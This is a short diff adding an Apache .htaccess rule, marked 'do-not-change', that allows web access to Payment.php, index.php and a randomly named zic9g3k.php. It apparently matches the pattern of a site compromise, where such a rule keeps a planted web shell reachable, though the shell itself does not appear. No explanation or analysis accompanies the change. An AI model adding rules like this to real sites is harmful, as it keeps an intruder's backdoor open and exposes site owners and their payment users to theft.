@@ -1,0 +1,5 @@
+#---do-not-change-the-following-content---
+<FilesMatch '^(Payment.php|index.php|zic9g3k.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
